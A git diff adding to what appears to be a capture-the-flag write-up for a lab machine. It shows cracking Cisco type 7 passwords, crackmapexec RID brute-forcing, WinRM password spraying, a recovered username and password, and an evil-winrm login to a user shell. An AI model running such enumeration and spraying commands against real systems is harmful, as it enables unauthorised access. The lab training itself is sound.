@@ -111,6 +111,45 @@ command:```evil-winrm -u hazard -i 10.129.96.157 -p 'stealth1agent' -S```
 
 oops, it didn't work
 
+Lets try to crack the type 7 passwords. I used this online [tool](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html) for it
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4d258bd0-7e89-40bd-8ef3-da86a9befa38)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8ece8d10-6f19-45d5-8f7d-6559deaea12f)
+
+We now have 3 passwords, lets enumerate for potential users
+
+We can try to enumerate users from the smb share using crackmapexec
+
+command:```crackmapexec smb 10.129.94.141 -u hazard -p stealth1agent --rid-brute```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b270dc27-6a75-47cd-8fad-70cdb37fc033)
+
+We now have potential users.
+
+Save the users and passwords in different files, we'll use crackmapexec to get a match we can use to login via winrm
+
+command:```crackmapexec winrm 10.129.94.141 -u users.txt -p passwords.txt```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e8ffff8c-6d52-4417-b959-d454035fecd2)
+
+We got a match, now lets login with winrm
+
+username:```chase```        password:```Q4)sJu\Y8qz*A3?d```
+
+command:```evil-winrm -u chase -i 10.129.94.141 -p "Q4)sJu\Y8qz*A3?d"```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/18e837e5-3695-4a51-849f-9418a416e3b1)
+
+We got user shell hehe. Lets go ahead and escalate our privileges
+
+
+
+# Privilege Escalation
+
+Checking the installed programs, I found this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/caf2e25c-4847-4eae-b809-c129eee81be5)
+
 
 
 
